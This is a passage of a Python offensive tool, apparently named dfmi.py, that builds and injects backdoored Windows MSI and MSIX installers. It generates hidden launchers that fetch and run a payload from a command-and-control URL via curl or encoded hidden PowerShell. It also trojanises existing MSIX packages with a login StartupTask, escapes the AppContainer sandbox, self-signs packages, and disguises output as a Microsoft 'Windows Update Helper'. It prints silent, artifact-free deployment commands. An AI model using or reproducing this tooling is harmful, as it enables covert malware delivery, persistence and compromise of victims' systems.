    Write-Host "[PS] New PackageCode: $newPkg"
}} catch {{
    Write-Host "[PS] PackageCode update skipped: ${{_}}"
}}

$v = $db.OpenView("SELECT Target FROM CustomAction WHERE Action='$actionName'")
$v.Execute()
$r = $v.Fetch()
if ($r) {{
    Write-Host "[PS] Verified CustomAction: OK"
}} else {{
    Write-Host "[PS] Verified CustomAction: MISSING"; exit 1
}}
$v.Close()

$db.Commit()
Write-Host "[PS] Done: $output"
Write-Host "PRODCODE:$newProd"
"""
    print("[*] Running PowerShell stub builder...")
    ok, stdout, stderr = run_ps(ps_script)
    prod_code_out = prod_guid
    for line in stdout.split('\n'):
        line = line.strip()
        if line:
            if line.startswith('PRODCODE:'): prod_code_out = line.replace('PRODCODE:','').strip()
            else: print(f"  {line}")
    if not ok:
        if stderr:
            print("\n[!] PowerShell error:")
            for line in stderr.split('\n'):
                if line.strip(): print(f"    {line.strip()}")
        print("[!] stub build failed"); return False
    return prod_code_out

def cmd_stub(args):
    if not args or args[0] in ('-h', '--help'):
        print(HELP_STUB); return
    parsed = _parse_stub_args(args)
    if parsed is None:
        print("[!] --c2 <url> is required.\n"); print(HELP_STUB); return
    c2_url, mode, name, manufacturer, version, output, action_name, prop_name, seq_num, drop_name = parsed
    if action_name is None: action_name = gen_name()
    if prop_name is None:   prop_name   = gen_name()
    validate_msi_identifier(action_name, '--action-name')
    validate_msi_identifier(prop_name,   '--property-name')
    print(f"[*] C2 URL      : {c2_url}")
    print(f"[*] Mode        : {mode}")
    print(f"[*] Name        : {name}")
    print(f"[*] Manufacturer: {manufacturer}")
    print(f"[*] Version     : {version}")
    print(f"[*] Output      : {output}")
    print(f"[*] Platform    : {'Windows' if is_windows() else 'Linux'}")
    print()
    if mode == "ps": exe_args = build_ca_ps(c2_url, drop_name)
    elif mode == "cmd": exe_args = build_ca_cmd(c2_url, drop_name)
    else: print(f"[!] Unknown mode: {mode}"); return
    prod_guid = gen_guid(); upg_guid = gen_guid(); comp_guid = gen_guid()
    print(f"[*] ProductCode : {prod_guid}")
    if is_windows():
        prod_code = _stub_windows(c2_url, mode, name, manufacturer, version, output,
                                  exe_args, prod_guid, upg_guid, comp_guid,
                                  action_name=action_name, prop_name=prop_name, seq_num=seq_num)
    else:
        ok = _stub_linux(c2_url, mode, name, manufacturer, version, output,
                         exe_args, prod_guid, upg_guid, comp_guid,
                         action_name=action_name, prop_name=prop_name, seq_num=seq_num)
        prod_code = prod_guid if ok else None
    if not prod_code: return
    size = os.path.getsize(output) if os.path.exists(output) else 0
    print(f"\n[+] Output: {output} ({size:,} bytes)")
    print()
    print("=" * 60)
    print("DEPLOY (silent):")
    print(f'  msiexec /i "{output}" /qn')
    print()
    print("ARTIFACT-FREE:")
    print(f'  msiexec /i "{output}" /qn && msiexec /x {prod_code} /qn')
    print("=" * 60)

def _parse_stub_args(args):
    c2_url = None; mode = "ps"
    name = "Windows Update Helper"; manufacturer = "Microsoft Corporation"
    version = "1.0.0.0"; output = "stub.msi"
    action_name = None; prop_name = None; seq_num = 1510; drop_name = None
    i = 0
    while i < len(args):
        a = args[i]
        if a == '--c2' and i+1 < len(args):            c2_url = args[i+1]; i += 2
        elif a == '--mode' and i+1 < len(args):         mode = args[i+1]; i += 2
        elif a == '--name' and i+1 < len(args):         name = args[i+1]; i += 2
        elif a == '--manufacturer' and i+1 < len(args): manufacturer = args[i+1]; i += 2
        elif a == '--version' and i+1 < len(args):      version = args[i+1]; i += 2
        elif a in ('-o', '--output') and i+1 < len(args): output = args[i+1]; i += 2
        elif a == '--action-name' and i+1 < len(args):  action_name = args[i+1]; i += 2
        elif a == '--property-name' and i+1 < len(args):prop_name = args[i+1]; i += 2
        elif a == '--sequence' and i+1 < len(args):
            try:
                seq_num = int(args[i+1])
            except ValueError:
                print(f"[!] --sequence must be an integer, got: {args[i+1]}"); sys.exit(1)
            i += 2; continue
        elif a == '--drop-name' and i+1 < len(args):    drop_name = args[i+1]; i += 2
        elif a in ('-h', '--help'): return 'help'
        else: i += 1
    if not c2_url: return None
    return c2_url, mode, name, manufacturer, version, output, action_name, prop_name, seq_num, drop_name

# ─── MSIX Module ──────────────────────────────────────────────────────────

# 1x1 transparent PNG for MSIX icon placeholders (makeappx /nv skips size checks)
_PLACEHOLDER_PNG_B64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAC"
    "hwGA60e6kgAAAABJRU5ErkJggg=="
)

HELP_MSIX = """
Command: msix
=============
Create or backdoor MSIX packages.
[Windows only for stub/inject — requires Windows SDK: makeappx + signtool]
[inspect works cross-platform via Python zipfile]

Subcommands:
  stub     Create a standalone backdoored MSIX from scratch
  inject   Add a StartupTask payload to an existing MSIX
  inspect  Show manifest + file list of any MSIX

Stub Usage:
  python3 dfmi.py msix stub --c2 <url> [options]

  --c2 <url>           Payload URL (required)
  --mode ps|cmd        Delivery mode (default: ps)
  --name <name>        App display name    (default: random)
  --publisher <cn>     Publisher CN        (default: random)
  --version <ver>      Package version     (default: 1.0.0.0)
  --drop-name <name>   EXE drop name       (default: random, cmd mode)
  -o <output.msix>     Output file         (default: stub.msix)

Inject Usage:
  python3 dfmi.py msix inject <target.msix> <output.msix> --c2 <url> [options]

  --c2 <url>           Payload URL (required)
  --mode ps|cmd        Delivery mode (default: ps)
  --publisher <cn>     Publisher CN for re-signing (default: random)
  --drop-name <name>   EXE drop name (default: random, cmd mode)

Inspect Usage:
  python3 dfmi.py msix inspect <target.msix>

Key differences from MSI:
  - No CustomActions: payload runs as main exe (stub) or StartupTask (inject)
  - runFullTrust + Windows.FullTrustApplication: escapes AppContainer sandbox
  - Mandatory signing: self-signed cert auto-generated, .cer produced alongside

Install on target (run as Admin):
  Import-Certificate -FilePath out.cer -CertStoreLocation cert:\\LocalMachine\\TrustedPeople
  Add-AppxPackage -Path output.msix
"""

# ─── MSIX: Utilities ──────────────────────────────────────────────────────

def _find_sdk_tool(name):
    """Locate makeappx.exe or signtool.exe from any installed Windows SDK version."""
    kits = r"C:\Program Files (x86)\Windows Kits\10\bin"
    def _ver_key(path):
        try:
            ver_str = path.split(os.sep)[-3]
            return tuple(int(x) for x in ver_str.split('.'))
        except (ValueError, IndexError):
            return (0,)
    for arch in ('x64', 'x86'):
        matches = glob.glob(os.path.join(kits, '*', arch, name))
        if matches:
            return max(matches, key=_ver_key)
    return shutil.which(name)

def _gen_publisher_cn():
    """Generate a random-looking publisher Common Name."""
    prefixes = ['Contoso', 'Fabrikam', 'Northwind', 'Woodgrove', 'Tailspin', 'Litware']
    suffixes = ['Technologies', 'Software', 'Systems', 'Solutions', 'Enterprises', 'Corp']
    return f"{random.choice(prefixes)} {random.choice(suffixes)}"

def _msix_pkg_name(display_name):
    """Derive a valid MSIX package Identity Name from a display name."""
    return re.sub(r'[^A-Za-z0-9.]', '.', display_name).strip('.')

# ─── MSIX: Manifest generation ────────────────────────────────────────────

def _msix_manifest_stub(pkg_name, publisher_dn, version, exe_name, display_name):
    """Generate a complete AppxManifest.xml for stub mode."""
    xe_pkg  = html.escape(pkg_name,      quote=True)
    xe_pub  = html.escape(publisher_dn,  quote=True)
    xe_exe  = html.escape(exe_name,      quote=True)
    xe_disp = html.escape(display_name,  quote=True)
    return f"""<?xml version="1.0" encoding="utf-8"?>
<Package xmlns="http://schemas.microsoft.com/appx/manifest/foundation/windows10"
         xmlns:uap="http://schemas.microsoft.com/appx/manifest/uap/windows10"
         xmlns:rescap="http://schemas.microsoft.com/appx/manifest/foundation/windows10/restrictedcapabilities"
         IgnorableNamespaces="uap rescap">
  <Identity Name="{xe_pkg}" Publisher="{xe_pub}"
            Version="{version}" ProcessorArchitecture="x64" />
  <Properties>
    <DisplayName>{xe_disp}</DisplayName>
    <PublisherDisplayName>{xe_disp}</PublisherDisplayName>
    <Logo>Assets\\Square150x150Logo.png</Logo>
  </Properties>
  <Dependencies>
    <TargetDeviceFamily Name="Windows.Desktop"
      MinVersion="10.0.17763.0" MaxVersionTested="10.0.22000.0" />
  </Dependencies>
  <Resources>
    <Resource Language="en-us" />
  </Resources>
  <Applications>
    <Application Id="App" Executable="{xe_exe}"
                 EntryPoint="Windows.FullTrustApplication">
      <uap:VisualElements DisplayName="{xe_disp}" Description="{xe_disp}"
        BackgroundColor="transparent"
        Square150x150Logo="Assets\\Square150x150Logo.png"
        Square44x44Logo="Assets\\Square44x44Logo.png" />
    </Application>
  </Applications>
  <Capabilities>
    <rescap:Capability Name="runFullTrust" />
  </Capabilities>
</Package>"""

def _inject_manifest(xml_str, startup_exe, publisher_dn, task_id, display_name):
    """
    Modify an existing AppxManifest.xml for inject mode:
    - Update Publisher DN to match our signing cert
    - Add runFullTrust capability
    - Add required namespace declarations (uap, uap3, rescap)
    - Append a new Application with StartupTask extension
    """
    # Ensure required namespace declarations exist on <Package>
    for prefix, uri in [
        ('uap',   'http://schemas.microsoft.com/appx/manifest/uap/windows10'),
        ('uap3',  'http://schemas.microsoft.com/appx/manifest/uap/windows10/3'),
        ('rescap','http://schemas.microsoft.com/appx/manifest/foundation/windows10/restrictedcapabilities'),
    ]:
        decl = f'xmlns:{prefix}="{uri}"'
        if decl not in xml_str:
            xml_str = xml_str.replace('<Package ', f'<Package {decl}\n         ', 1)

    # Update IgnorableNamespaces to include new prefixes
    def _add_ignorable(m):
        existing = m.group(1)
        for p in ('uap', 'uap3', 'rescap'):
            if p not in existing:
                existing = p + ' ' + existing
        return f'IgnorableNamespaces="{existing.strip()}"'
    xml_str = re.sub(r'IgnorableNamespaces="([^"]*)"', _add_ignorable, xml_str)

    # XML-escape all user-supplied values before interpolation
    xe_pub  = html.escape(publisher_dn,  quote=True)
    xe_exe  = html.escape(startup_exe,   quote=True)
    xe_tid  = html.escape(task_id,       quote=True)
    xe_disp = html.escape(display_name,  quote=True)

    # Update Publisher DN in Identity element
    xml_str = re.sub(r'Publisher="[^"]*"', f'Publisher="{xe_pub}"', xml_str, count=1)

    # Add runFullTrust capability
    if 'runFullTrust' not in xml_str:
        rescap_cap = '    <rescap:Capability Name="runFullTrust" />'
        if '<Capabilities>' in xml_str:
            xml_str = xml_str.replace('</Capabilities>',
                                      f'{rescap_cap}\n  </Capabilities>')
        else:
            xml_str = xml_str.replace('</Package>',
                f'  <Capabilities>\n{rescap_cap}\n  </Capabilities>\n</Package>')

    # Ensure IgnorableNamespaces includes new prefixes (add if absent)
    if 'IgnorableNamespaces' not in xml_str:
        xml_str = xml_str.replace('<Package ', '<Package IgnorableNamespaces="uap uap3 rescap"\n         ', 1)

    # Append new Application with StartupTask before </Applications>
    startup_id = gen_name()
    new_app = f"""
    <Application Id="{startup_id}" Executable="{xe_exe}"
                 EntryPoint="Windows.FullTrustApplication">
      <uap:VisualElements DisplayName="{xe_disp}" Description="{xe_disp}"
        BackgroundColor="transparent"
        Square150x150Logo="Assets\\Square150x150Logo.png"
        Square44x44Logo="Assets\\Square44x44Logo.png" />
      <Extensions>
        <uap3:Extension Category="windows.startupTask">
          <uap3:StartupTask TaskId="{xe_tid}" Enabled="true"
                             DisplayName="{xe_disp}" />
        </uap3:Extension>
      </Extensions>
    </Application>"""
    xml_str = xml_str.replace('</Applications>', new_app + '\n  </Applications>')

    return xml_str

# ─── MSIX: PowerShell helpers ─────────────────────────────────────────────

def _msix_launcher_ps(exec_path, exec_args, out_exe):
    """
    PowerShell script: compile a hidden C# launcher.exe via Add-Type.
    exec_path / exec_args are embedded as C# string literals (backslash + quote escaped).
    """
    safe_out  = out_exe.replace("'", "''")
    # Strip control characters that would break C# source or change semantics
    ctrl_re = re.compile(r'[\x00-\x08\x0a-\x1f\x7f]')
    exec_path = ctrl_re.sub('', exec_path)
    exec_args = ctrl_re.sub('', exec_args)
    # Escape for C# string literal: \ → \\, " → \"
    cs_exec = exec_path.replace('\\', '\\\\').replace('"', '\\"')
    cs_args = exec_args.replace('\\', '\\\\').replace('"', '\\"')
    # C# source — embedded in PS single-quoted here-string (no PS expansion)
    cs = f"""using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class P {{
    [DllImport("user32.dll")]    static extern bool ShowWindow(IntPtr h, int n);
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [STAThread] static void Main() {{
        ShowWindow(GetConsoleWindow(), 0);
        try {{
            var psi = new ProcessStartInfo("{cs_exec}", "{cs_args}");
            psi.WindowStyle   = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            Process.Start(psi);
        }} catch {{}}
    }}
}}"""
    return f"""
$code = @'
{cs}
'@
try {{
    Add-Type -TypeDefinition $code -OutputAssembly '{safe_out}' `
             -OutputType ConsoleApplication -ErrorAction Stop
}} catch {{
    Write-Host "COMPILE_FAIL: $_"; exit 1
}}
if (Test-Path '{safe_out}') {{ Write-Host 'COMPILE_OK' }} else {{ Write-Host 'COMPILE_FAIL'; exit 1 }}
"""

def _msix_cert_ps(cn, out_dir):
    """PowerShell script: generate self-signed code-signing cert, export .pfx + .cer."""
    pfx = os.path.join(out_dir, 'signing.pfx').replace("'", "''")
    cer = os.path.join(out_dir, 'signing.cer').replace("'", "''")
    safe_cn = cn.replace("'", "''")
    return f"""
$pfxPass = ConvertTo-SecureString -String 'dfmi123' -Force -AsPlainText
$cert = New-SelfSignedCertificate -Type Custom -Subject 'CN={safe_cn}' `
    -KeyUsage DigitalSignature -FriendlyName '{safe_cn}' `
    -CertStoreLocation 'Cert:\\CurrentUser\\My' `
    -TextExtension @('2.5.29.37={{text}}1.3.6.1.5.5.7.3.3','2.5.29.19={{text}}')
Export-PfxCertificate -Cert $cert -FilePath '{pfx}' -Password $pfxPass | Out-Null
Export-Certificate -Cert $cert -FilePath '{cer}' | Out-Null
Remove-Item "Cert:\\CurrentUser\\My\\$($cert.Thumbprint)" -Force -ErrorAction SilentlyContinue
if ((Test-Path '{pfx}') -and (Test-Path '{cer}')) {{
    Write-Host 'CERT_OK'
}} else {{ Write-Host 'CERT_FAIL'; exit 1 }}
"""

def _msix_sign_ps(msix_path, pfx_path, pfx_pass, signtool_path):
    """PowerShell script: sign MSIX with signtool."""
    safe_msix    = msix_path.replace("'", "''")
    safe_pfx     = pfx_path.replace("'", "''")
    safe_sign    = signtool_path.replace("'", "''")
    return f"""
$out = & '{safe_sign}' sign /fd SHA256 /a /f '{safe_pfx}' /p '{pfx_pass}' '{safe_msix}' 2>&1
if ($LASTEXITCODE -eq 0) {{ Write-Host 'SIGN_OK' }} else {{ Write-Host "SIGN_FAIL: $out"; exit 1 }}
"""

# ─── MSIX: Shared cert+sign pipeline ──────────────────────────────────────

def _msix_cert_and_sign(msix_unsigned, output, out_dir, publisher_cn, signtool):
    """Generate cert, sign MSIX, copy .cer alongside output. Returns True on success."""
    cer_out = os.path.splitext(output)[0] + '.cer'
    pfx_path = os.path.join(out_dir, 'signing.pfx')
    cer_path = os.path.join(out_dir, 'signing.cer')
    pfx_pass = 'dfmi123'

    print("[*] Generating self-signed certificate...")
    ok, stdout, stderr = run_ps(_msix_cert_ps(publisher_cn, out_dir))
    if not ok or 'CERT_OK' not in stdout:
        print(f"[!] Certificate failed: {stderr}"); return False
    print("    OK")

    print("[*] Signing MSIX...")
    ok, stdout, stderr = run_ps(_msix_sign_ps(msix_unsigned, pfx_path, pfx_pass, signtool))
    if not ok or 'SIGN_OK' not in stdout:
        print(f"[!] Signing failed: {stdout} {stderr}"); return False
    print("    OK")

    shutil.copy(msix_unsigned, output)
    shutil.copy(cer_path, cer_out)
    return cer_out

# ─── MSIX: Stub ───────────────────────────────────────────────────────────

def _stub_msix_windows(c2_url, mode, name, publisher_cn, version, output, drop_name):
    if not is_windows():
        print("[!] msix stub requires Windows."); return False

    makeappx = _find_sdk_tool('makeappx.exe')
    signtool  = _find_sdk_tool('signtool.exe')
    for tool, path in [('makeappx.exe', makeappx), ('signtool.exe', signtool)]:
        if not path:
            print(f"[!] {tool} not found. Install Windows SDK 10.")
            print("    https://developer.microsoft.com/windows/downloads/windows-sdk/")
            return False

    output       = os.path.abspath(output)
    publisher_dn = f"CN={publisher_cn}"
    pkg_name     = _msix_pkg_name(name)

    # Build payload launcher args
    if mode == 'ps':
        ca        = build_ca_ps(c2_url, drop_name)
        b64_enc   = ca.split('-Enc ')[1].split(' &')[0]
        exec_path = 'powershell.exe'
        exec_args = f'-NoP -W Hidden -NonI -Exec Bypass -Enc {b64_enc}'
    else:
        dn        = drop_name or gen_drop_name()
        exec_path = 'cmd.exe'
        exec_args = f'/c "curl -s {c2_url} -o %TEMP%\\{dn} && start /b %TEMP%\\{dn}"'

    tmpdir = tempfile.mkdtemp()
    try:
        pkg_dir    = os.path.join(tmpdir, 'pkg')
        assets_dir = os.path.join(pkg_dir, 'Assets')
        os.makedirs(assets_dir)

        # Placeholder icons (makeappx /nv skips validation)
        icon_data = base64.b64decode(_PLACEHOLDER_PNG_B64)
        for icon in ['Square150x150Logo.png', 'Square44x44Logo.png']:
            with open(os.path.join(assets_dir, icon), 'wb') as f:
                f.write(icon_data)

        # Compile launcher.exe
        launcher = os.path.join(pkg_dir, 'launcher.exe')
        print("[*] Compiling launcher.exe via Add-Type...")
        ok, stdout, stderr = run_ps(_msix_launcher_ps(exec_path, exec_args, launcher))
        if not ok or 'COMPILE_OK' not in stdout:
            print(f"[!] Compilation failed: {stderr}"); return False
        print("    OK")

        # Write manifest
        manifest = _msix_manifest_stub(pkg_name, publisher_dn, version, 'launcher.exe', name)
        with open(os.path.join(pkg_dir, 'AppxManifest.xml'), 'w', encoding='utf-8') as f:
            f.write(manifest)

        # Pack
        msix_unsigned = os.path.join(tmpdir, 'unsigned.msix')
        print("[*] Packing MSIX...")
        r = subprocess.run([makeappx, 'pack', '/d', pkg_dir, '/p', msix_unsigned, '/nv', '/o'],
                           capture_output=True, text=True)
        if r.returncode != 0:
            print(f"[!] makeappx pack failed: {r.stderr.strip()}"); return False
        print(f"    OK ({os.path.getsize(msix_unsigned):,} bytes)")

        # Cert + sign + copy
        cer_out = _msix_cert_and_sign(msix_unsigned, output,
                                       tmpdir, publisher_cn, signtool)
        if not cer_out:
            return False

        size = os.path.getsize(output)
        print(f"\n[+] MSIX  : {output} ({size:,} bytes)")
        print(f"[+] Cert  : {cer_out}")
        print()
        print("=" * 60)
        print("TRUST CERT on target (run as Admin):")
        print(f'  Import-Certificate -FilePath "{os.path.basename(cer_out)}" \\')
        print('    -CertStoreLocation cert:\\LocalMachine\\TrustedPeople')
        print()
        print("INSTALL:")
        print(f'  Add-AppxPackage -Path "{os.path.basename(output)}"')
        print()
        print("ARTIFACT-FREE UNINSTALL:")
        print(f'  Get-AppxPackage *{pkg_name}* | Remove-AppxPackage')
        print("=" * 60)
        return True
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

# ─── MSIX: Inject ─────────────────────────────────────────────────────────

def _inject_msix_windows(target, output, c2_url, mode, publisher_cn, drop_name):
    if not is_windows():
        print("[!] msix inject requires Windows."); return False
    if not os.path.exists(target):
        print(f"[!] File not found: {target}"); return False

    makeappx = _find_sdk_tool('makeappx.exe')
    signtool  = _find_sdk_tool('signtool.exe')
    for tool, path in [('makeappx.exe', makeappx), ('signtool.exe', signtool)]:
        if not path:
            print(f"[!] {tool} not found. Install Windows SDK 10."); return False

    target       = os.path.abspath(target)
    output       = os.path.abspath(output)
    publisher_dn = f"CN={publisher_cn}"
    task_id      = gen_name(8)
    startup_name = gen_name(6).lower() + '.exe'

    # Build payload launcher args (same as stub)
    if mode == 'ps':
        ca        = build_ca_ps(c2_url, drop_name)
        b64_enc   = ca.split('-Enc ')[1].split(' &')[0]
        exec_path = 'powershell.exe'
        exec_args = f'-NoP -W Hidden -NonI -Exec Bypass -Enc {b64_enc}'
    else:
        dn        = drop_name or gen_drop_name()
        exec_path = 'cmd.exe'
        exec_args = f'/c "curl -s {c2_url} -o %TEMP%\\{dn} && start /b %TEMP%\\{dn}"'

    tmpdir = tempfile.mkdtemp()
    try:
        pkg_dir = os.path.join(tmpdir, 'pkg')
        os.makedirs(pkg_dir)

        # Unpack original MSIX
        print(f"[*] Unpacking {os.path.basename(target)}...")
        r = subprocess.run([makeappx, 'unpack', '/p', target, '/d', pkg_dir, '/nv'],
                           capture_output=True, text=True)
        if r.returncode != 0:
            print(f"[!] makeappx unpack failed: {r.stderr.strip()}"); return False
        print(f"    OK ({len(os.listdir(pkg_dir))} items)")

        # Read and modify manifest
        manifest_path = os.path.join(pkg_dir, 'AppxManifest.xml')
        if not os.path.exists(manifest_path):
            print("[!] AppxManifest.xml not found in MSIX"); return False
        with open(manifest_path, 'r', encoding='utf-8') as f:
            manifest_xml = f.read()

        # Derive a display name from existing manifest
        m = re.search(r'<DisplayName>([^<]+)</DisplayName>', manifest_xml)
        display_name = m.group(1) if m else "Windows Update"

        print(f"[*] Modifying manifest (task={task_id}, startup={startup_name})...")
        modified_xml = _inject_manifest(manifest_xml, startup_name,
                                         publisher_dn, task_id, display_name)
        with open(manifest_path, 'w', encoding='utf-8') as f:
            f.write(modified_xml)
        print("    OK")

        # Ensure Assets/ exists with placeholder icons
        assets_dir = os.path.join(pkg_dir, 'Assets')
        os.makedirs(assets_dir, exist_ok=True)
        icon_data = base64.b64decode(_PLACEHOLDER_PNG_B64)
        for icon in ['Square150x150Logo.png', 'Square44x44Logo.png']:
            icon_path = os.path.join(assets_dir, icon)
            if not os.path.exists(icon_path):
                with open(icon_path, 'wb') as f:
                    f.write(icon_data)

        # Compile startup.exe
        startup_path = os.path.join(pkg_dir, startup_name)
        print(f"[*] Compiling {startup_name} via Add-Type...")
        ok, stdout, stderr = run_ps(_msix_launcher_ps(exec_path, exec_args, startup_path))
        if not ok or 'COMPILE_OK' not in stdout:
            print(f"[!] Compilation failed: {stderr}"); return False
        print("    OK")

        # Repack
        msix_unsigned = os.path.join(tmpdir, 'unsigned.msix')
        print("[*] Repacking MSIX...")
        r = subprocess.run([makeappx, 'pack', '/d', pkg_dir, '/p', msix_unsigned, '/nv', '/o'],
                           capture_output=True, text=True)
        if r.returncode != 0:
            print(f"[!] makeappx pack failed: {r.stderr.strip()}"); return False
        print(f"    OK ({os.path.getsize(msix_unsigned):,} bytes)")

        # Cert + sign + copy
        cer_out = _msix_cert_and_sign(msix_unsigned, output,
                                       tmpdir, publisher_cn, signtool)
        if not cer_out:
            return False

        size = os.path.getsize(output)
        print(f"\n[+] MSIX  : {output} ({size:,} bytes)")
        print(f"[+] Cert  : {cer_out}")
        print(f"[+] Payload fires: on user login (StartupTask '{task_id}')")
        print()
        print("=" * 60)
        print("TRUST CERT on target (run as Admin):")
        print(f'  Import-Certificate -FilePath "{os.path.basename(cer_out)}" \\')
        print('    -CertStoreLocation cert:\\LocalMachine\\TrustedPeople')
        print()
        print("INSTALL:")
        print(f'  Add-AppxPackage -Path "{os.path.basename(output)}"')
        print("=" * 60)
        return True
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

# ─── MSIX: Inspect (cross-platform) ───────────────────────────────────────

def _inspect_msix(msix_path):
    if not os.path.exists(msix_path):
        print(f"[!] File not found: {msix_path}"); return
    print(f"\n{'='*60}\n  MSIX: {msix_path}\n{'='*60}")
    try:
        with zipfile.ZipFile(msix_path, 'r') as z:
            names = z.namelist()
            print(f"\n[Files] ({len(names)} total)")
            for info in sorted(z.infolist(), key=lambda x: x.file_size, reverse=True):
                print(f"  {info.filename:<55} {info.file_size:>10,}")
            print("\n[AppxManifest.xml — key lines]")
            if 'AppxManifest.xml' in names:
                xml = z.read('AppxManifest.xml').decode('utf-8', errors='replace')
                keywords = ('Identity', 'Publisher', 'Application', 'Executable',
                            'StartupTask', 'Capability', 'DisplayName', 'EntryPoint')
                for line in xml.splitlines():
                    if any(kw in line for kw in keywords):
                        print(f"  {line.strip()[:110]}")
            else:
                print("  (AppxManifest.xml not found)")
            if 'AppxSignature.p7x' in names:
                print("\n[Signature] present (AppxSignature.p7x)")
            else:
                print("\n[Signature] NOT present (unsigned)")
    except zipfile.BadZipFile:
        print("[!] Not a valid ZIP/MSIX file")
    print()

# ─── MSIX: CLI ────────────────────────────────────────────────────────────

def cmd_msix(args):
    if not args or args[0] in ('-h', '--help'):
        print(HELP_MSIX); return
    sub = args[0]; rest = args[1:]
    if sub == 'stub':
        if not rest or rest[0] in ('-h', '--help'): print(HELP_MSIX); return
        parsed = _parse_msix_stub_args(rest)
        if parsed is None: print("[!] --c2 <url> is required.\n"); print(HELP_MSIX); return
        c2_url, mode, name, publisher_cn, version, output, drop_name = parsed
        print(f"[*] C2 URL   : {c2_url}")
        print(f"[*] Mode     : {mode}")
        print(f"[*] Name     : {name}")
        print(f"[*] Publisher: {publisher_cn}")
        print(f"[*] Version  : {version}")
        print(f"[*] Output   : {output}")
        print()
        _stub_msix_windows(c2_url, mode, name, publisher_cn, version, output, drop_name)
    elif sub == 'inject':
        if len(rest) < 3 or rest[0] in ('-h', '--help'): print(HELP_MSIX); return
        parsed = _parse_msix_inject_args(rest)
        if parsed is None: print("[!] --c2 <url> is required.\n"); print(HELP_MSIX); return
        target, output, c2_url, mode, publisher_cn, drop_name = parsed
        if not os.path.exists(target):
            print(f"[!] Target not found: {target}"); return
        print(f"[*] Target   : {target}")
        print(f"[*] Output   : {output}")
        print(f"[*] C2 URL   : {c2_url}")
        print(f"[*] Mode     : {mode}")
        print(f"[*] Publisher: {publisher_cn}")
        print()
        _inject_msix_windows(target, output, c2_url, mode, publisher_cn, drop_name)
    elif sub == 'inspect':
        if not rest: print("[!] Usage: msix inspect <file.msix>"); return
        _inspect_msix(rest[0])
    else:
        print(f"[!] Unknown msix subcommand: {sub}"); print(HELP_MSIX)

def _parse_msix_stub_args(args):
    c2_url = None; mode = 'ps'; drop_name = None
    name         = None
    publisher_cn = None
    version      = '1.0.0.0'
    output       = 'stub.msix'
    i = 0
    while i < len(args):
        a = args[i]
        if a == '--c2' and i+1 < len(args):          c2_url       = args[i+1]; i += 2
        elif a == '--mode' and i+1 < len(args):       mode         = args[i+1]; i += 2
        elif a == '--name' and i+1 < len(args):       name         = args[i+1]; i += 2
        elif a == '--publisher' and i+1 < len(args):  publisher_cn = args[i+1]; i += 2
        elif a == '--version' and i+1 < len(args):    version      = args[i+1]; i += 2
        elif a == '--drop-name' and i+1 < len(args):  drop_name    = args[i+1]; i += 2
        elif a in ('-o', '--output') and i+1 < len(args): output   = args[i+1]; i += 2
        elif a in ('-h', '--help'): return 'help'
        else: i += 1
    if not c2_url: return None
    if name is None:         name         = _gen_publisher_cn()
    if publisher_cn is None: publisher_cn = _gen_publisher_cn()
    return c2_url, mode, name, publisher_cn, version, output, drop_name

def _parse_msix_inject_args(args):
    if len(args) < 2: return None
    target = args[0]; output = args[1]; rest = args[2:]
    c2_url = None; mode = 'ps'; drop_name = None; publisher_cn = None
    i = 0
    while i < len(rest):
        a = rest[i]
        if a == '--c2' and i+1 < len(rest):          c2_url       = rest[i+1]; i += 2
        elif a == '--mode' and i+1 < len(rest):       mode         = rest[i+1]; i += 2
        elif a == '--publisher' and i+1 < len(rest):  publisher_cn = rest[i+1]; i += 2
        elif a == '--drop-name' and i+1 < len(rest):  drop_name    = rest[i+1]; i += 2
        elif a in ('-h', '--help'): return 'help'
        else: i += 1
    if not c2_url: return None
    if publisher_cn is None: publisher_cn = _gen_publisher_cn()
    return target, output, c2_url, mode, publisher_cn, drop_name


if __name__ == "__main__":
    print(BANNER)
    if len(sys.argv) < 2 or sys.argv[1] in ('-h', '--help'):
        print(HELP_MAIN); sys.exit(0)
    command = sys.argv[1]
    rest    = sys.argv[2:]
    if command == 'inject': cmd_inject(rest)
    elif command == 'rogue-mst': cmd_rogue_mst(rest)
    elif command == 'stub': cmd_stub(rest)
    elif command == 'msix': cmd_msix(rest)
    else:
        print(f"[!] Unknown command: {command}\n")
        print(HELP_MAIN); sys.exit(1)
